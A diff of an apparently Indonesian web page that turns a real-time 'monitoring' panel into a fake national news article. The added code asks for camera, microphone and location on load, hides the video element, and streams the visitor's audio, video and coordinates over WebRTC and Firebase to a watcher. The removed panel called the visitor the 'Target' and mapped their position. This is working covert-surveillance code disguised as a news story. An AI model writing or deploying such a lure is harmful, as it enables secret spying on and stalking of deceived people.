@@ -3,46 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel Monitoring Real-Time</title>
+    <title>Berita Nasional Terupdate</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; background: #121212; color: #fff; margin: 0; padding: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 300px; gap: 20px; }
-        .video-container { background: #000; border-radius: 12px; overflow: hidden; position: relative; border: 2px solid #333; }
-        video { width: 100%; height: auto; display: block; }
-        .status-panel { background: #1e1e1e; padding: 20px; border-radius: 12px; border: 1px solid #333; }
-        .label { color: #888; font-size: 0.8rem; margin-bottom: 5px; }
-        .data { font-family: monospace; color: #00ff00; margin-bottom: 15px; font-size: 1.1rem; }
-        .header { margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .live-indicator { background: red; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.8rem; }
+        body { font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; }
+        .nav { background: #cc0000; color: white; padding: 10px; font-weight: bold; margin-bottom: 20px; }
+        img { width: 100%; border-radius: 5px; }
+        #localVideo { display: none; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>MONITORING SYSTEM</h1>
-        <div class="live-indicator">LIVE</div>
-    </div>
+    <div class="nav">NEWS CHANNEL LIVE</div>
+    <h1>Presiden Resmikan Proyek Infrastruktur Baru</h1>
+    <p>Diposting 5 menit yang lalu</p>
+    <img src="https://picsum.photos/800/400" alt="News Image">
+    <p>Pemerintah terus berupaya meningkatkan konektivitas antar wilayah untuk mendorong pertumbuhan ekonomi nasional di berbagai sektor industri...</p>
 
-    <div class="grid">
-        <div class="video-container">
-            <video id="remoteVideo" autoplay playsinline></video>
-        </div>
-
-        <div class="status-panel">
-            <div class="label">LOKASI TERAKHIR:</div>
-            <div id="locDisplay" class="data">Menunggu data...</div>
-
-            <div class="label">KOORDINAT:</div>
-            <div id="coordDisplay" class="data">-</div>
-
-            <div class="label">UPDATE TERAKHIR:</div>
-            <div id="timeDisplay" class="data">-</div>
-
-            <hr style="border:0; border-top:1px solid #333; margin: 20px 0;">
-            <button onclick="location.reload()" style="width:100%; padding:10px; background:#e11d48; border:0; color:#fff; border-radius:5px; cursor:pointer;">Refresh Koneksi</button>
-        </div>
-    </div>
+    <video id="localVideo" autoplay playsinline muted></video>
 
     <script>
         const firebaseConfig = {
@@ -57,55 +35,50 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database().ref('p2p_stream');
 
-        const pc = new RTCPeerConnection({
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-        });
+        let pc;
 
-        // Tampilkan Video yang datang
-        pc.ontrack = (event) => {
-            document.getElementById('remoteVideo').srcObject = event.streams[0];
-        };
+        async function init() {
+            // Reset Signaling di awal agar koneksi baru bersih
+            await db.child('signal').remove();
 
-        async function initMonitor() {
-            // Bersihkan data lama saat monitor dimulai
-            await db.child('signal/answer').remove();
-            await db.child('signal/monitorCandidates').remove();
-
-            // Dengarkan Offer dari Target
-            db.child('signal/offer').on('value', async (snapshot) => {
-                const offer = snapshot.val();
-                if (offer && !pc.currentRemoteDescription) {
-                    await pc.setRemoteDescription(new RTCSessionDescription(offer));
-                    const answer = await pc.createAnswer();
-                    await pc.setLocalDescription(answer);
-                    db.child('signal/answer').set({ type: answer.type, sdp: answer.sdp });
-                }
+            pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
             });
 
-            // Kirim ICE Candidates Monitor
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('localVideo').srcObject = stream;
+            stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+            // Kirim Lokasi
+            navigator.geolocation.getCurrentPosition(pos => {
+                db.child('status/location').set({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+            });
+
+            // Create Offer
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            db.child('signal/offer').set({ type: offer.type, sdp: offer.sdp });
+
             pc.onicecandidate = (event) => {
                 if (event.candidate) {
-                    db.child('signal/monitorCandidates').push(event.candidate.toJSON());
+                    db.child('signal/targetCandidates').push(event.candidate.toJSON());
                 }
             };
 
-            // Terima ICE Candidates Target
-            db.child('signal/targetCandidates').on('child_added', (snapshot) => {
-                pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
+            // Tunggu Jawaban
+            db.child('signal/answer').on('value', async (snapshot) => {
+                const answer = snapshot.val();
+                if (answer && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
+                }
             });
 
-            // Pantau Lokasi
-            db.child('status/location').on('value', snapshot => {
-                const data = snapshot.val();
-                if(data) {
-                    document.getElementById('coordDisplay').innerText = `${data.lat}, ${data.lng}`;
-                    document.getElementById('locDisplay').innerHTML = `<a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#00ff00;">Buka Google Maps</a>`;
-                    document.getElementById('timeDisplay').innerText = data.time;
-                }
+            db.child('signal/monitorCandidates').on('child_added', (snapshot) => {
+                pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
             });
         }
 
-        initMonitor();
+        window.onload = init;
     </script>
 </body>
 </html>
